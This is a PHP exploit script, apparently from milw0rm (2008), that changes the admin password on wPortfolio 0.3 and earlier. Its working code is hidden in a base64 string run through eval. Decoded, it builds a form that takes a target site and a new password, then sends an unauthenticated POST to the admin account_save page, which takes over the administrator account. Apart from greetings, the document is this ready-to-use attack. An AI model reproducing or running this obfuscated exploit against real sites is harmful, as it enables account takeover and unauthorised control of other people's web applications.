<?php
/*
==============================================================================
                      _      _       _          _      _   _ 
                     / \    | |     | |        / \    | | | |
                    / _ \   | |     | |       / _ \   | |_| |
                   / ___ \  | |___  | |___   / ___ \  |  _  |
   IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|
                                                             

==============================================================================
                      ____   _  _     _   _    ___    _  __
                     / ___| | || |   | \ | |  / _ \  | |/ /
                    | |  _  | || |_  |  \| | | | | | | ' / 
                    | |_| | |__   _| | |\  | | |_| | | . \ 
                     \____|    |_|   |_| \_|  \___/  |_|\_\

==============================================================================
	wPortfolio <= 0.3 Admin Password Changing Exploit
==============================================================================

	[Â»] Script:             [ wPortfolio <= 0.3 ]
	[Â»] Language:           [ PHP ]
	[Â»] Webpage:            [ http://sourceforge.net/projects/wportfolio/ ]
	[Â»] Type:               [ OS ]
	[Â»] Report-Date:        [ 20.11.2008 ]
	[Â»] Founder:            [ G4N0K <mail.ganok[at]gmail.com> ]


===[ XPL ]===*/

                 
                 $GNK = "ZWNobyAiPFRJVExFPndQb3J0Zm9saW8gPD0gMC4zIEFkbWluIFBhc3N3b3JkIENoYW5naW5nIEV4".
			"cGxvaXQgfCBCeTogRzROMEs8L1RJVExFPiI7DQokRzROMEsgPSA8PDxFT0cNCj09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PQ0KICAgICAgICAgICAgICAgICAgICAgIF8gICAgICBfICAgICAgIF8gICAgICAg".
			"ICAgXyAgICAgIF8gICBfIA0KICAgICAgICAgICAgICAgICAgICAgLyBcICAgIHwgfCAgICAgfCB8".
			"ICAgICAgICAvIFwgICAgfCB8IHwgfA0KICAgICAgICAgICAgICAgICAgICAvIF8gXCAgIHwgfCAg".
			"ICAgfCB8ICAgICAgIC8gXyBcICAgfCB8X3wgfA0KICAgICAgICAgICAgICAgICAgIC8gX19fIFwg".
			"IHwgfF9fXyAgfCB8X19fICAgLyBfX18gXCAgfCAgXyAgfA0KICAgSU4gVEhFIE5BTUUgT0YgL18v".
			"ICAgXF9cIHxfX19fX3wgfF9fX19ffCAvXy8gICBcX1wgfF98IHxffA0KICAgICAgICAgICAgICAg".
			"ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQo9PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT0NCiAgICAgICAgICAgICAgICAgICAgICBfX19fICAgXyAgXyAgICAgXyAg".
			"IF8gICAgX19fICAgIF8gIF9fDQogICAgICAgICAgICAgICAgICAgICAvIF9fX3wgfCB8fCB8ICAg".
			"fCBcIHwgfCAgLyBfIFwgIHwgfC8gLw0KICAgICAgICAgICAgICAgICAgICB8IHwgIF8gIHwgfHwg".
			"fF8gIHwgIFx8IHwgfCB8IHwgfCB8ICcgLyANCiAgICAgICAgICAgICAgICAgICAgfCB8X3wgfCB8".
			"X18gICBffCB8IHxcICB8IHwgfF98IHwgfCAuIFwgDQogICAgICAgICBlWHBsbyF0IEJ5ICBcX19f".
			"X3wgICAgfF98ICAgfF98IFxffCAgXF9fXy8gIHxffFxfXA0KDQo9PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT0NCgl3UG9ydGZvbGlvIDw9IDAuMyBBZG1pbiBQYXNzd29yZCBDaGFuZ2luZyBFeHBsb2l0DQo9".
			"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09".
			"PT09PT09PT09PT09PT09PT09PT0NCg0KRU9HOw0KZWNobyAiPHByZT4iLiRHNE4wSy4iPC9wcmU+".
			"IjskRk9STSA9ICI8YnIgLz48Rk9STSBhY3Rpb249XCIiLiRfU0VSVkVSWyJQSFBfU0VMRiJdLiJc".
			"IiBtZXRob2Q9XCJQT1NUXCI+IjskRk9STS49IDw8PEZGRg0KICAgIDxQIHN0eWxlPSJ3aWR0aDog".
			"MzAwcHg7Y2xlYXI6IGxlZnQ7bWFyZ2luOiAwO3BhZGRpbmc6IDVweCAwIDhweCAwO3BhZGRpbmct".
			"bGVmdDogMTU1cHg7Ym9yZGVyLXRvcDogMXB4IGRhc2hlZCBncmF5OyI+DQogICAgPExBQkVMIHN0".
			"eWxlPSJmb250LXdlaWdodDogYm9sZDtmbG9hdDogbGVmdDttYXJnaW4tbGVmdDogLTE1NXB4O3dp".
			"ZHRoOjE1MHB4OyIgZm9yPSJNU0RHTksiPiBXZWJzaXRlIDogJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5i".
			"c3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7aHR0cDovLzwvTEFCRUw+DQog".
			"ICAgICAgICAgICAgIDxJTlBVVCBzdHlsZT0id2lkdGg6IDE4MHB4OyIgdHlwZT0idGV4dCIgbmFt".
			"ZT0iTVNER05LIiBpZD0iTVNER05LIj48YnIgLz4NCiAgICA8TEFCRUwgc3R5bGU9ImZvbnQtd2Vp".
			"Z2h0OiBib2xkO2Zsb2F0OiBsZWZ0O21hcmdpbi1sZWZ0OiAtMTU1cHg7d2lkdGg6MTUwcHg7IiBm".
			"b3I9IlBBVEgiPlBhdGg6ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwO1svd1BvcnRmb2xp".
			"b108L0xBQkVMPg0KICAgICAgICAgICAgICA8SU5QVVQgc3R5bGU9IndpZHRoOiAxODBweDsiIHR5".
			"cGU9InRleHQiIG5hbWU9IlBBVEgiIGlkPSJQQVRIIiB2YWx1ZT0iLyI+PEJSPg0KICAgIDxQIHN0".
			"eWxlPSJ3aWR0aDogMzAwcHg7Y2xlYXI6IGxlZnQ7bWFyZ2luOiAwO3BhZGRpbmc6IDVweCAwIDhw".
			"eCAwO3BhZGRpbmctbGVmdDogMTU1cHg7Ym9yZGVyLXRvcDogMXB4IGRhc2hlZCBncmF5OyI+DQoJ".
			"PExBQkVMIHN0eWxlPSJmb250LXdlaWdodDogYm9sZDtmbG9hdDogbGVmdDttYXJnaW4tbGVmdDog".
			"LTE1NXB4O3dpZHRoOjE1MHB4OyIgZm9yPSJucHciPiBOZXcgUGFzc3dvcmQgOiA8L0xBQkVMPg0K".
			"ICAgICAgICAgICAgICA8SU5QVVQgc3R5bGU9IndpZHRoOiAxODBweDsiIHR5cGU9InRleHQiIG5h".
			"bWU9Im5wdyIgaWQ9Im5wdyI+PEJSPg0KCTxQIHN0eWxlPSJ3aWR0aDogMzAwcHg7Y2xlYXI6IGxl".
			"ZnQ7bWFyZ2luOiAwO3BhZGRpbmc6IDVweCAwIDhweCAwO3BhZGRpbmctbGVmdDogMTU1cHg7Ym9y".
			"ZGVyLXRvcDogMXB4IGRhc2hlZCBncmF5OyI+DQogICAgPElOUFVUIHR5cGU9InN1Ym1pdCIgbmFt".
			"ZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIGl0ISI+IDxJTlBVVCB0eXBlPSJyZXNldCI+DQogICAg".
			"PC9QPg0KIDwvRk9STT4NCkZGRjsNCmlmKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKXskbmV3X3B3".
			"ZD1tZDUoJF9QT1NUWyducHcnXSk7JHBvc3Q9InNpdGVuYW1lPS0lMjB3ZWJwb3J0Zm9saW8lMjAt".
			"Jl9zdGF0dXNiYXI9c3RhdHVzJTIwYmFyJmJhbm5lcj1jb3B5cmlnaHQmZW1haWw9bWFpbC5nYW5v".
			"ayU0MGdtYWlsLmNvbSZwYXNzd29yZD0iLiRuZXdfcHdkLiImcGFzc3dvcmRfcmV0eXBlPSIuJG5l".
			"d19wd2QuIlxyXG4iOyRqb2tlID0gIlBPU1QgLyIuJF9QT1NUWyJQQVRIIl0uIi9hZG1pbi91c2Vy".
			"aW5mby5waHA/YWN0aW9uPWFjY291bnRfc2F2ZSBIVFRQLzEuMVxyXG5Ib3N0OiAiLiRfUE9TVFsi".
			"TVNER05LIl0uIlxyXG5Vc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93".
			"cyBOVCA1LjE7IGVuLVVTOyBydjoxLjkpIEdlY2tvLzIwMDgwNTI5MDYgRmlyZWZveC8zLjBcclxu".
			"S2VlcC1BbGl2ZTogMzAwXHJcbkNvbm5lY3Rpb246IGtlZXAtYWxpdmVcclxuQ29udGVudC1UeXBl".
			"OiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuQ29udGVudC1MZW5ndGg6IDE5".
			"MFxyXG5cclxuIi4kcG9zdDskcmVzID0gIiI7JGF0dGFjayA9IGZzb2Nrb3BlbigkX1BPU1RbIk1T".
			"REdOSyJdLCI4MCIsJGVycm5vLCAkZXJyc3RyLCA1MCk7aWYoISRhdHRhY2spe2VjaG8oIjxiciAv".
			"PldURiwgZXJyIzogKCRlcnJubykuJGVycnN0ciIpO3JldHVybjt9ZWNobygiPHNwYW4gc3R5bGU9".
			"XCJmb250Om5vcm1hbCA4cHQgdGFob21hO1wiPlsrXSA8Yj5Db25uZWN0ZWQuLi48YnIvPjwvYj5b".
			"K10gPGI+U2VuZGluZyByZXF1ZXN0Li4uPGJyLz48L2I+Iik7ZndyaXRlKCRhdHRhY2ssJGpva2Up".
			"O3doaWxlKCFmZW9mKCRhdHRhY2spKXskcmVzLj1mZ2V0cygkYXR0YWNrKTt9ZmNsb3NlKCRhdHRh".
			"Y2spO2lmIChzdHJpc3RyKCRyZXMsICJzYXZlZCIpKXtlY2hvICJbK108Yj4gRXhwbG9pdGVkICEg".
			"LCA8Zm9udCBjb2xvcj1cInJlZFwiPlBhc3N3b3JkIGNoYW5nZWQuLi48L2I+PC9mb250PjxiciAv".
			"PiAgICAgWytdIC4uLjxiciAvPiAgICAgWytdIDxiPm5ldyBwYXNzd29yZDo8L2I+ICIuJF9QT1NU".
			"WyducHcnXS4iPGJyIC8+ICAgICBbK108Yj4gYWRtaW4gcGFuZWw6PC9iPiBodHRwOi8vIi4kX1BP".
			"U1RbIk1TREdOSyJdLiRfUE9TVFsiUEFUSCJdLiIvYWRtaW4vPGJyIC8+PGJyIC8+PGJyIC8+PGJy".
			"IC8+PGJyIC8+PGJyIC8+PGJyIC8+PHNwYW4gc3R5bGU9XCJmb250Om5vcm1hbCA4cHQgdGFob21h".
			"O2NvbG9yOiNDQ0M7XCI+RXhwbG9pdCBCeSBHNE4wSy4uLjwvc3Bhbj4iO30gZWxzZSB7IGVjaG8g".
			"IlsrXTxiPiBPb3BzLCBzcnksIG5vdCB2dWxuLi4uITwvYj48YnIgLz5bIV0gPGk+ZG91YmxlIGNo".
			"ZWNrIHlvdXIgaW5wdXQuLi48L2k+Ijt9Zmx1c2goKTt9ZWxzZXtlY2hvJEZPUk07fQ0K";
		eval(base64_decode($GNK));

/*
===[ Greetz ]===

	[Â»] ALLAH
	[Â»] Tornado2800 <Tornado2800[at]gmail.com> // bedone in nemishe :D
	[Â»] Hussain-X <darkangel_g85[at]yahoo.com> // Jazakallah...
	[Â»] Str0ke //Hey Brotha keep rocking on ;)
	[Â»] Saudi-L0rd,Sakab...
	[Â»] SMN,MSD-KiD,SED,AMD,MSN...

	//Are ya looking for something that has not BUGz at all...!? I know it... It's The Holy Quran. [:-)
	//ALLAH,forgimme...

===============================================================================
exit();
===============================================================================*/
?>

# milw0rm.com [2008-11-20]
